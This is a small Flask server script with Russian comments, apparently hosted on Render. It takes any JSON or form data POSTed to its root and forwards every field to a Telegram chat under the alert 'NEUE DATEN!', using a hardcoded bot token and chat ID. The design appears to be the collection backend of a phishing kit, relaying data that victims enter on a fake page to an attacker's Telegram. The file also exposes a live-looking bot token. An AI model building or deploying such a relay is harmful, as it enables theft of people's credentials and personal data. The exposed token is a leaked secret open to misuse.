from flask import Flask, request
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8999243130:AAE3dBaylqJxM3BiXaCFQs9SXoi8V1EJ2qY"
CHAT_ID = "-1003980397965"

def send_to_telegram(data):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = "🔴 <b>NEUE DATEN!</b>\n\n"
    for key, value in data.items():
        message += f"<b>{key}</b>: {value}\n"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Ошибка: {e}")

@app.route("/", methods=["POST"])
def handle_post():
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    send_to_telegram(data)
    return "OK", 200

# ============================================================
# 🔥 Health check для Render — ЭТО ВАЖНО!
# ============================================================
@app.route("/health", methods=["GET", "HEAD"])
def health():
    return "OK", 200

# ============================================================
# 🔥 HEAD-запросы на корень — тоже нужны для мониторинга
# ============================================================
@app.route("/", methods=["HEAD"])
def head_root():
    return "", 200

@app.route("/", methods=["GET"])
def index():
    return """
    <h2>✅ Сервис работает!</h2>
    <p>Отправляйте POST-запросы с данными на этот URL.</p>
    <p>Пример:</p>
    <pre>
    curl -X POST https://flssdbt.onrender.com/ \\
      -H "Content-Type: application/json" \\
      -d '{"username": "test"}'
    </pre>
    """, 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
